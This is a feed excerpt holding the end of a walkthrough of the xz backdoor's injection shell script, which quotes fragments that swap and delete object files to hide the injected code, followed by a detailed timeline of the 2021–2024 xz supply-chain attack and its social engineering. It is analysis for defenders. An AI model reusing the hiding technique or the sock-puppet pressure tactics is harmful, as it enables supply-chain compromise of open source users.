true&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Now we are in the inner compiler success case. Delete backups.&#xA;&lt;pre&gt;else&#xA;mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true&#xA;mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true&#xA;fi&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;This is the else for the crc32 compilation failing. Restore from backups.&#xA;&lt;pre&gt;else&#xA;mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true&#xA;fi&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;This is the else for the crc64 compilation failing. Restore from backup. (This is not the cleanest shell script in the world!)&#xA;&lt;pre&gt;rm -f liblzma_la-crc64-fast.o || true&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Now we are at the end of the Makefile section of the script. Delete the backup.&#xA;&lt;pre&gt;fi&#xA;eval $DHLd&#xA;$&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Close the “&lt;code&gt;elif&lt;/code&gt; we’re in a Makefile”, one more extension point/debug print, and we’re done!&#xA;The script has injected the object file into the objects built during &lt;code&gt;make&lt;/code&gt;, leaving no trace behind.&#xA;</content>
  </entry>
  <entry>
    <title>Timeline of the xz open source attack</title>
    <id>tag:research.swtch.com,2012:research.swtch.com/xz-timeline</id>
    <link rel="alternate" href="http://research.swtch.com/xz-timeline"></link>
    <published>2024-04-01T23:23:00-04:00</published>
    <updated>2024-04-03T09:25:00-04:00</updated>
    <summary type="text">A detailed timeline of the xz open source attack, from 2021 to 2024.</summary>
    <content type="html">&#xA;&#xA;&lt;p&gt;&#xA;Over a period of over two years, an attacker using the name “Jia Tan”&#xA;worked as a diligent, effective contributor to the xz compression library,&#xA;eventually being granted commit access and maintainership.&#xA;Using that access, they installed a very subtle, carefully hidden backdoor into liblzma,&#xA;a part of xz that also happens to be a dependency of OpenSSH sshd&#xA;on Debian, Ubuntu, and Fedora, and other systemd-based Linux systems that patched sshd to link libsystemd.&#xA;(Note that this does not include systems like Arch Linux, Gentoo, and NixOS, which do not patch sshd.)&#xA;That backdoor watches for the attacker sending hidden commands at the start of an SSH session,&#xA;giving the attacker the ability to run an arbitrary command on the target system without logging in:&#xA;unauthenticated, targeted remote code execution.&#xA;&#xA;&lt;p&gt;&#xA;The attack was &lt;a href=&#34;https://www.openwall.com/lists/oss-security/2024/03/29/4&#34;&gt;publicly disclosed on March 29, 2024&lt;/a&gt; and&#xA;appears to be the first serious known supply chain attack on widely used open source software.&#xA;It marks a watershed moment in open source supply chain security, for better or worse.&#xA;&#xA;&lt;p&gt;&#xA;This post is a detailed timeline that I have constructed of the&#xA;social engineering aspect of the attack, which appears to date&#xA;back to late 2021.&#xA;(See also my &lt;a href=&#34;xz-script&#34;&gt;analysis of the attack script&lt;/a&gt;.)&#xA;&#xA;&lt;p&gt;&#xA;Corrections or additions welcome on &lt;a href=&#34;https://bsky.app/profile/swtch.com/post/3kp4my7wdom2q&#34;&gt;Bluesky&lt;/a&gt;, &lt;a href=&#34;https://hachyderm.io/@rsc/112199506755478946&#34;&gt;Mastodon&lt;/a&gt;, or &lt;a href=&#34;mailto:rsc@swtch.com&#34;&gt;email&lt;/a&gt;.&#xA;&lt;a class=anchor href=&#34;#prologue&#34;&gt;&lt;h2 id=&#34;prologue&#34;&gt;Prologue&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2005–2008&lt;/b&gt;: &lt;a href=&#34;https://github.com/kobolabs/liblzma/blob/87b7682ce4b1c849504e2b3641cebaad62aaef87/doc/history.txt&#34;&gt;Lasse Collin, with help from others&lt;/a&gt;, designs the .xz file format using the LZMA compression algorithm, which compresses files to about 70% of what gzip did [1]. Over time this format becomes widely used for compressing tar files, Linux kernel images, and many other uses.&#xA;&lt;a class=anchor href=&#34;#jia_tan_arrives_on_scene_with_supporting_cast&#34;&gt;&lt;h2 id=&#34;jia_tan_arrives_on_scene_with_supporting_cast&#34;&gt;Jia Tan arrives on scene, with supporting cast&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2021-10-29&lt;/b&gt;: Jia Tan sends &lt;a href=&#34;https://www.mail-archive.com/xz-devel@tukaani.org/msg00512.html&#34;&gt;first, innocuous patch&lt;/a&gt; to the xz-devel mailing list, adding “.editorconfig” file.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2021-11-29&lt;/b&gt;: Jia Tan sends &lt;a href=&#34;https://www.mail-archive.com/xz-devel@tukaani.org/msg00519.html&#34;&gt;second innocuous patch&lt;/a&gt; to the xz-devel mailing list, fixing an apparent reproducible build problem. More patches that seem (even in retrospect) to be fine follow.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2022-02-07&lt;/b&gt;: Lasse Collin merges &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commitdiff;h=6468f7e41a8e9c611e4ba8d34e2175c5dacdbeb4&#34;&gt;first commit with “jiat0218@gmail.com” as author in git metadata&lt;/a&gt; (“liblzma: Add NULL checks to LZMA and LZMA2 properties encoders”).&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2022-04-19&lt;/b&gt;: Jia Tan sends &lt;a href=&#34;https://www.mail-archive.com/xz-devel@tukaani.org/msg00553.html&#34;&gt;yet another innocuous patch&lt;/a&gt; to the xz-devel mailing list.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2022-04-22&lt;/b&gt;: “Jigar Kumar” sends &lt;a href=&#34;https://www.mail-archive.com/xz-devel@tukaani.org/msg00557.html&#34;&gt;first of a few emails&lt;/a&gt; complaining about Jia Tan’s patch not landing. (“Patches spend years on this mailing list. There is no reason to think anything is coming soon.”) At this point, Lasse Collin has already landed four of Jia Tan’s patches, marked by “Thanks to Jia Tan” in the commit message.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2022-05-19&lt;/b&gt;: “Dennis Ens” sends &lt;a href=&#34;https://www.mail-archive.com/xz-devel@tukaani.org/msg00562.html&#34;&gt;mail to xz-devel&lt;/a&gt; asking if XZ for Java is maintained.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2022-05-19&lt;/b&gt;: Lasse Collin &lt;a href=&#34;https://www.mail-archive.com/xz-devel@tukaani.org/msg00563.html&#34;&gt;replies&lt;/a&gt; apologizing for slowness and adds “Jia Tan has helped me off-list with XZ Utils and he might have a bigger role in the future at least with XZ Utils. It’s clear that my resources are too limited (thus the many emails waiting for replies) so something has to change in the long term.”&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2022-05-27&lt;/b&gt;: Jigar Kumar sends &lt;a href=&#34;https://www.mail-archive.com/xz-devel@tukaani.org/msg00565.html&#34;&gt;pressure email&lt;/a&gt; to patch thread. “Over 1 month and no closer to being merged. Not a surprise.”&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2022-06-07&lt;/b&gt;: Jigar Kumar sends &lt;a href=&#34;https://www.mail-archive.com/xz-devel@tukaani.org/msg00566.html&#34;&gt;pressure email&lt;/a&gt; to Java thread. “Progress will not happen until there is new maintainer. XZ for C has sparse commit log too. Dennis you are better off waiting until new maintainer happens or fork yourself. Submitting patches here has no purpose these days. The current maintainer lost interest or doesn’t care to maintain anymore. It is sad to see for a repo like this.”&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2022-06-08&lt;/b&gt;: Lasse Collin &lt;a href=&#34;https://www.mail-archive.com/xz-devel@tukaani.org/msg00567.html&#34;&gt;pushes back&lt;/a&gt;. “I haven’t lost interest but my ability to care has been fairly limited mostly due to longterm mental health issues but also due to some other things. Recently I’ve worked off-list a bit with Jia Tan on XZ Utils and perhaps he will have a bigger role in the future, we’ll see. It’s also good to keep in mind that this is an unpaid hobby project.”&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2022-06-10&lt;/b&gt;: Lasse Collin merges &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commitdiff;h=aa75c5563a760aea3aa23d997d519e702e82726b&#34;&gt;first commit with “Jia Tan” as author in git metadata&lt;/a&gt; (“Tests: Created tests for hardware functions”). Note also that there was one earlier commit on 2022-02-07 that had the full name set only to jiat75.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2022-06-14&lt;/b&gt;: Lasse Collin merges &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commitdiff;h=0354d6cce3ff98ea6f927107baf216253f6ce2bb&#34;&gt;only commit with “jiat75@gmail.com” as author&lt;/a&gt;. This could have been a temporary git misconfiguration on Jia Tan’s side forgetting their fake email address.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2022-06-14&lt;/b&gt;: Jugar Kumar sends &lt;a href=&#34;https://www.mail-archive.com/xz-devel@tukaani.org/msg00568.html&#34;&gt;pressure email&lt;/a&gt;. “With your current rate, I very doubt to see 5.4.0 release this year. The only progress since april has been small changes to test code. You ignore the many  patches bit rotting away on this mailing list. Right now you choke your repo. Why wait until 5.4.0 to change maintainer? Why delay what your repo needs?”&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2022-06-21&lt;/b&gt;: Dennis Ens sends &lt;a href=&#34;https://www.mail-archive.com/xz-devel@tukaani.org/msg00569.html&#34;&gt;pressure email&lt;/a&gt;. “I am sorry about your mental health issues, but its important to be aware of your own limits. I get that this is a hobby project for all contributors, but the community desires more. Why not pass on maintainership for XZ for C so you can give XZ for Java more attention? Or pass on XZ for Java to someone else to focus on XZ for C? Trying to maintain both means that neither are maintained well.”&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2022-06-22&lt;/b&gt;: Jigar Kumar sends &lt;a href=&#34;https://www.mail-archive.com/xz-devel@tukaani.org/msg00570.html&#34;&gt;pressure email&lt;/a&gt; to C patch thread. “Is there any progress on this? Jia I see you have recent commits. Why can’t you commit this yourself?”&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2022-06-29&lt;/b&gt;: Lasse Collin &lt;a href=&#34;https://www.mail-archive.com/xz-devel@tukaani.org/msg00571.html&#34;&gt;replies&lt;/a&gt;: “As I have hinted in earlier emails, Jia Tan may have a bigger role in the project in the future. He has been helping a lot off-list and is practically a co-maintainer already. :-) I know that not much has happened in the git repository yet but things happen in small steps. In any case some change in maintainership is already in progress at least for XZ Utils.”&#xA;&lt;a class=anchor href=&#34;#jia_tan_becomes_maintainer&#34;&gt;&lt;h2 id=&#34;jia_tan_becomes_maintainer&#34;&gt;Jia Tan becomes maintainer&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;At this point Lasse seems to have started working even more closely with Jia Tan. Brian Krebs &lt;a href=&#34;https://infosec.exchange/@briankrebs/112197305365490518&#34;&gt;observes&lt;/a&gt; that many of these email addresses never appeared elsewhere on the internet, even in data breaches (nor again in xz-devel). It seems likely that they were fakes created to push Lasse to give Jia more control. It worked. Over the next few months, Jia started replying to threads on xz-devel authoritatively about the upcoming 5.4.0 release.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2022-09-27&lt;/b&gt;: Jia Tan gives &lt;a href=&#34;https://www.mail-archive.com/xz-devel@tukaani.org/msg00593.html&#34;&gt;release summary&lt;/a&gt; for 5.4.0. (“The 5.4.0 release that will contain the multi threaded decoder is planned for December. The list of open issues related to 5..4.0 [sic] in general that I am tracking are...”)&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2022-10-28&lt;/b&gt;: Jia Tan &lt;a href=&#34;https://github.com/JiaT75?tab=overview&amp;from=2022-10-01&amp;to=2022-10-31&#34;&gt;added to the Tukaani organization&lt;/a&gt; on GitHub. Being an organization member does not imply any special access, but it is a necessary step before granting maintainer access.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2022-11-30&lt;/b&gt;: Lasse Collin &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commitdiff;h=764955e2d4f2a5e8d6d6fec63af694f799e050e7&#34;&gt;changes bug report email&lt;/a&gt; from his personal address to an alias that goes to him and Jia Tan, notes in README that “the project maintainers Lasse Collin and Jia Tan can be reached via &lt;a href=&#34;mailto:xz@tukaani.org&#34;&gt;xz@tukaani.org&lt;/a&gt;”.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2022-12-30&lt;/b&gt;: Jia Tan merges &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commitdiff;h=8ace358d65059152d9a1f43f4770170d29d35754&#34;&gt;a batch of commits directly into the xz repo&lt;/a&gt; (“CMake: Update .gitignore for CMake artifacts from in source build”). At this point we know they have commit access. Interestingly, a &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commitdiff;h=799ead162de63b8400733603d3abcd2e1977bdca&#34;&gt;few commits later&lt;/a&gt; in the same batch is the only commit with a different full name: “Jia Cheong Tan”.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2023-01-11&lt;/b&gt;: Lasse Collin &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commitdiff;h=18b845e69752c975dfeda418ec00eda22605c2ee&#34;&gt;tags and builds his final release&lt;/a&gt;, v5.4.1.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2023-03-18&lt;/b&gt;: Jia Tan &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commitdiff;h=6ca8046ecbc7a1c81ee08f544bfd1414819fb2e8&#34;&gt;tags and builds their first release&lt;/a&gt;, v5.4.2.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2023-03-20&lt;/b&gt;: Jia Tan &lt;a href=&#34;https://github.com/google/oss-fuzz/commit/6403e93344476972e908ce17e8244f5c2b957dfd&#34;&gt;updates Google oss-fuzz configuration&lt;/a&gt; to send bugs to them.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2023-06-22&lt;/b&gt;: Hans Jansen sends &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commitdiff;h=23b5c36fb71904bfbe16bb20f976da38dadf6c3b&#34;&gt;a pair&lt;/a&gt; of &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commitdiff;h=b72d21202402a603db6d512fb9271cfa83249639&#34;&gt;patches&lt;/a&gt;, merged by Lasse Collin, that use the “&lt;a href=&#34;https://maskray.me/blog/2021-01-18-gnu-indirect-function&#34;&gt;GNU indirect function&lt;/a&gt;” feature to select a fast CRC function at startup time. The final commit is &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commitdiff;h=ee44863ae88e377a5df10db007ba9bfadde3d314&#34;&gt;reworked by Lasse Collin&lt;/a&gt; and merged by Jia Tan. This change is important because it provides a hook by which the backdoor code can modify the global function tables before they are remapped read-only. While this change could be an innocent performance optimization by itself, Hans Jansen returns in 2024 to promote the backdoored xz and otherwise does not exist on the internet.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2023-07-07&lt;/b&gt;: Jia Tan &lt;a href=&#34;https://github.com/google/oss-fuzz/commit/d2e42b2e489eac6fe6268e381b7db151f4c892c5&#34;&gt;disables ifunc support during oss-fuzz builds&lt;/a&gt;, claiming ifunc is incompatible with address sanitizer. This may well be innocuous on its own, although it is also more groundwork for using ifunc later.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-01-19&lt;/b&gt;: Jia Tan &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commitdiff;h=c26812c5b2c8a2a47f43214afe6b0b840c73e4f5&#34;&gt;moves web site to GitHub pages&lt;/a&gt;, giving them control over the XZ Utils web page. Lasse Collin presumably created the DNS records for the xz.tukaani.org subdomain that points to GitHub pages. After the attack was discovered, Lasse Collin deleted this DNS record to move back to &lt;a href=&#34;https://tukaani.org&#34;&gt;tukaani.org&lt;/a&gt;, which he controls.&#xA;&lt;a class=anchor href=&#34;#attack_begins&#34;&gt;&lt;h2 id=&#34;attack_begins&#34;&gt;Attack begins&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-02-23&lt;/b&gt;: Jia Tan &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commitdiff;h=cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0&#34;&gt;merges hidden backdoor binary code&lt;/a&gt; well hidden inside some binary test input files. The README already said (from long before Jia Tan showed up) “This directory contains bunch of files to test handling of .xz, .lzma (LZMA_Alone), and .lz (lzip) files in decoder implementations. Many of the files have been created by hand with a hex editor, thus there is no better “source code” than the files themselves.” Having these kinds of test files is very common for this kind of library. Jia Tan took advantage of this to add a few files that wouldn’t be carefully reviewed.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-02-24&lt;/b&gt;: Jia Tan &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commitdiff;h=2d7d862e3ffa8cec4fd3fdffcd84e984a17aa429&#34;&gt;tags and builds v5.6.0&lt;/a&gt; and publishes an xz-5.6.0.tar.gz distribution with an extra, malicious build-to-host.m4 that adds the backdoor when building a deb/rpm package. This m4 file is not present in the source repository, but many other legitimate ones are added during package as well, so it’s not suspicious by itself. But the script has been modified from the usual copy to add the backdoor. See my &lt;a href=&#34;xz-script&#34;&gt;xz attack shell script walkthrough post&lt;/a&gt; for more.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-02-24&lt;/b&gt;: Gentoo &lt;a href=&#34;https://bugs.gentoo.org/925415&#34;&gt;starts seeing crashes in 5.6.0&lt;/a&gt;. This seems to be an actual ifunc bug, rather than a bug in the hidden backdoor, since this is the first xz with Hans Jansen’s ifunc changes, and Gentoo does not patch sshd to use libsystemd, so it doesn’t have the backdoor.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-02-26&lt;/b&gt;: Debian &lt;a href=&#34;https://tracker.debian.org/news/1506761/accepted-xz-utils-560-01-source-into-unstable/&#34;&gt;adds xz-utils 5.6.0-0.1&lt;/a&gt; to unstable.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-02-27&lt;/b&gt;: Jia Tan starts emailing Richard W.M. Jones to update Fedora 40 (privately confirmed by Rich Jones).&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-02-28&lt;/b&gt;: Debian &lt;a href=&#34;https://tracker.debian.org/news/1507917/accepted-xz-utils-560-02-source-into-unstable/&#34;&gt;adds xz-utils 5.6.0-0.2&lt;/a&gt; to unstable.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-02-28&lt;/b&gt;: Jia Tan &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commitdiff;h=a100f9111c8cc7f5b5f0e4a5e8af3de7161c7975&#34;&gt;breaks landlock detection&lt;/a&gt; in configure script by adding a subtle typo in the C program used to check for &lt;a href=&#34;https://docs.kernel.org/userspace-api/landlock.html&#34;&gt;landlock support&lt;/a&gt;. The configure script tries to build and run the C program to check for landlock support, but since the C program has a syntax error, it will never build and run, and the script will always decide there is no landlock support. Lasse Collin is listed as the committer; he may have missed the subtle typo, or the author may be forged. Probably the former, since Jia Tan did not bother to forge committer on his many other changes. This patch seems to be setting up for something besides the sshd change, since landlock support is part of the xz command and not liblzma. Exactly what is unclear.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-02-29&lt;/b&gt;: On GitHub, @teknoraver &lt;a href=&#34;https://github.com/systemd/systemd/pull/31550&#34;&gt;sends pull request&lt;/a&gt; to stop linking liblzma into libsystemd. It appears that this would have defeated the attack. &lt;a href=&#34;https://doublepulsar.com/inside-the-failed-attempt-to-backdoor-ssh-globally-that-got-caught-by-chance-bbfe628fafdd&#34;&gt;Kevin Beaumont speculates&lt;/a&gt; that knowing this was on the way may have accelerated the attacker’s schedule. @teknoraver &lt;a href=&#34;https://news.ycombinator.com/item?id=39916125&#34;&gt;commented on HN&lt;/a&gt; that the liblzma PR was one in a series of dependency slimming changes for libsystemd; there were &lt;a href=&#34;https://github.com/systemd/systemd/pull/31131#issuecomment-1917693005&#34;&gt;two&lt;/a&gt; &lt;a href=&#34;https://github.com/systemd/systemd/pull/31131#issuecomment-1918667390&#34;&gt;mentions&lt;/a&gt; of it in late January.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-03-04&lt;/b&gt;: RedHat distributions &lt;a href=&#34;https://bugzilla.redhat.com/show_bug.cgi?id=2267598&#34;&gt;start seeing Valgrind errors&lt;/a&gt; in liblzma’s &lt;code&gt;_get_cpuid&lt;/code&gt; (the entry to the backdoor). The race is on to fix this before the Linux distributions dig too deeply.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-03-05&lt;/b&gt;: The &lt;a href=&#34;https://github.com/systemd/systemd/commit/3fc72d54132151c131301fc7954e0b44cdd3c860&#34;&gt;libsystemd PR is merged&lt;/a&gt; to remove liblzma. Another race is on, to get liblzma backdoor’ed before the distros break the approach entirely.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-03-05&lt;/b&gt;: Debian &lt;a href=&#34;https://tracker.debian.org/news/1509743/xz-utils-560-02-migrated-to-testing/&#34;&gt;adds xz-utils 5.6.0-0.2&lt;/a&gt; to testing.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-03-05&lt;/b&gt;: Jia Tan commits &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commitdiff;h=ed957d39426695e948b06de0ed952a2fbbe84bd1&#34;&gt;two ifunc&lt;/a&gt; &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commitdiff;h=4e1c97052b5f14f4d6dda99d12cbbd01e66e3712&#34;&gt;bug fixes&lt;/a&gt;. These seem to be real fixes for the actual ifunc bug. One commit links to the Gentoo bug and also typos an &lt;a href=&#34;https://gcc.gnu.org/bugzilla/show_bug.cgi?id=114115&#34;&gt;upstream GCC bug&lt;/a&gt;.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-03-08&lt;/b&gt;: Jia Tan &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commitdiff;h=82ecc538193b380a21622aea02b0ba078e7ade92&#34;&gt;commits purported Valgrind fix&lt;/a&gt;. This is a misdirection, but an effective one.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-03-09&lt;/b&gt;: Jia Tan &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commitdiff;h=74b138d2a6529f2c07729d7c77b1725a8e8b16f1&#34;&gt;commits updated backdoor files&lt;/a&gt;. This is the actual Valgrind fix, changing the two test files containing the attack code. “The original files were generated with random local to my machine. To better reproduce these files in the future, a constant seed was used to recreate these files.”&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-03-09&lt;/b&gt;: Jia Tan &lt;a href=&#34;https://git.tukaani.org/?p=xz.git;a=commitdiff;h=fd1b975b7851e081ed6e5cf63df946cd5cbdbb94&#34;&gt;tags and build v5.6.1&lt;/a&gt; and publishes xz 5.6.1 distribution, containing a new backdoor. To date I have not seen any analysis of how the old and new backdoors differ.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-03-20&lt;/b&gt;: Lasse Collin sends LKML a patch set &lt;a href=&#34;https://lkml.org/lkml/2024/3/20/1009&#34;&gt;replacing his personal email&lt;/a&gt; with &lt;a href=&#34;https://lkml.org/lkml/2024/3/20/1008&#34;&gt;both himself and Jia Tan&lt;/a&gt; as maintainers of the xz compression code in the kernel. There is no indication that Lasse Collin was acting nefariously here, just cleaning up references to himself as sole maintainer. Of course, Jia Tan may have prompted this, and being able to send xz patches to the Linux kernel would have been a nice point of leverage for Jia Tan’s future work. We’re not at &lt;a href=&#34;nih&#34;&gt;trusting trust&lt;/a&gt; levels yet, but it would be one step closer.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-03-25&lt;/b&gt;: Hans Jansen is back (!), &lt;a href=&#34;https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1067708&#34;&gt;filing a Debian bug&lt;/a&gt; to get xz-utils updated to 5.6.1. Like in the 2022 pressure campaign, more name###@mailhost addresses that don’t otherwise exist on the internet show up to advocate for it.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-03-27&lt;/b&gt;: Debian updates to 5.6.1.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-03-28&lt;/b&gt;: Jia Tan &lt;a href=&#34;https://bugs.launchpad.net/ubuntu/+source/xz-utils/+bug/2059417&#34;&gt;files an Ubuntu bug&lt;/a&gt; to get xz-utils updated to 5.6.1 from Debian.&#xA;&lt;a class=anchor href=&#34;#attack_detected&#34;&gt;&lt;h2 id=&#34;attack_detected&#34;&gt;Attack detected&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-03-28&lt;/b&gt;: Andres Freund discovers bug, privately notifies Debian and distros@openwall. RedHat assigns CVE-2024-3094.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-03-28&lt;/b&gt;: Debian &lt;a href=&#34;https://tracker.debian.org/news/1515519/accepted-xz-utils-561really545-1-source-into-unstable/&#34;&gt;rolls back 5.6.1&lt;/a&gt;, introducing 5.6.1+really5.4.5-1.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-03-28&lt;/b&gt;: Arch Linux &lt;a href=&#34;https://gitlab.archlinux.org/archlinux/packaging/packages/xz/-/commit/881385757abdc39d3cfea1c3e34ec09f637424ad&#34;&gt;changes 5.6.1 to build from Git&lt;/a&gt;.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-03-29&lt;/b&gt;: Andres Freund &lt;a href=&#34;https://www.openwall.com/lists/oss-security/2024/03/29/4&#34;&gt;posts backdoor warning&lt;/a&gt; to public oss-security@openwall list, saying he found it “over the last weeks”.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-03-29&lt;/b&gt;: RedHat &lt;a href=&#34;https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users&#34;&gt;announces that the backdoored xz shipped&lt;/a&gt; in Fedora Rawhide and Fedora Linux 40 beta.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-03-30&lt;/b&gt;: Debian &lt;a href=&#34;https://fulda.social/@Ganneff/112184975950858403&#34;&gt;shuts down builds&lt;/a&gt; to rebuild their build machines using Debian stable (in case the malware xz escaped their sandbox?).&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;2024-03-30&lt;/b&gt;: Haiku OS &lt;a href=&#34;https://github.com/haikuports/haikuports/commit/3644a3db2a0ad46971aa433c105e2cce9d141b46&#34;&gt;moves to GitHub source repo snapshots&lt;/a&gt;.&#xA;&lt;a class=anchor href=&#34;#further_reading&#34;&gt;&lt;h2 id=&#34;further_reading&#34;&gt;Further Reading&lt;/h2&gt;&lt;/a&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;Evan Boehs, &lt;a href=&#34;https://boehs.org/node/everything-i-know-about-the-xz-backdoor&#34;&gt;Everything I know about the XZ backdoor&lt;/a&gt; (2024-03-29).&#xA;&lt;li&gt;&#xA;Filippo Valsorda, &lt;a href=&#34;https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b&#34;&gt;Bluesky&lt;/a&gt; re backdoor operation (2024-03-30).&#xA;&lt;li&gt;&#xA;Michał Zalewski, &lt;a href=&#34;https://lcamtuf.substack.com/p/technologist-vs-spy-the-xz-backdoor&#34;&gt;Techies vs spies: the xz backdoor debate&lt;/a&gt; (2024-03-30).&#xA;&lt;li&gt;&#xA;Michał Zalewski, &lt;a href=&#34;https://lcamtuf.substack.com/p/oss-backdoors-the-allure-of-the-easy&#34;&gt;OSS backdoors: the folly of the easy fix&lt;/a&gt; (2024-03-31).&#xA;&lt;li&gt;&#xA;Connor Tumbleson, &lt;a href=&#34;https://connortumbleson.com/2024/03/31/watching-xz-unfold-from-afar/&#34;&gt;Watching xz unfold from afar&lt;/a&gt; (2024-03-31).&#xA;&lt;li&gt;&#xA;nugxperience, &lt;a href=&#34;https://twitter.com/nugxperience/status/1773906926503591970&#34;&gt;Twitter&lt;/a&gt; re awk and rc4 (2024-03-29)&#xA;&lt;li&gt;&#xA;birchb0y, &lt;a href=&#34;https://twitter.com/birchb0y/status/1773871381890924872&#34;&gt;Twitter&lt;/a&gt; re time of day of commit vs level of evil (2024-03-29)&#xA;&lt;li&gt;&#xA;Dan Feidt, &lt;a href=&#34;https://unicornriot.ninja/2024/xz-utils-software-backdoor-uncovered-in-years-long-hacking-plot/&#34;&gt;‘xz utils’ Software Backdoor Uncovered in Years-Long Hacking Plot&lt;/a&gt; (2024-03-30)&#xA;&lt;li&gt;&#xA;smx-smz, &lt;a href=&#34;https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504&#34;&gt;[WIP] XZ Backdoor Analysis and symbol mapping&lt;/a&gt;&#xA;&lt;li&gt;&#xA;Dan Goodin, &lt;a href=&#34;https://arstechnica.com/security/2024/04/what-we-know-about-the-xz-utils-backdoor-that-almost-infected-the-world/&#34;&gt;What we know about the xz Utils backdoor that almost infected the world&lt;/a&gt; (2024-04-01)&#xA;&lt;li&gt;&#xA;Akamai Security Intelligence Group, &lt;a href=&#34;https://www.akamai.com/blog/security-research/critical-linux-backdoor-xz-utils-discovered-what-to-know&#34;&gt;XZ Utils Backdoor — Everything You Need to Know, and What You Can Do&lt;/a&gt; 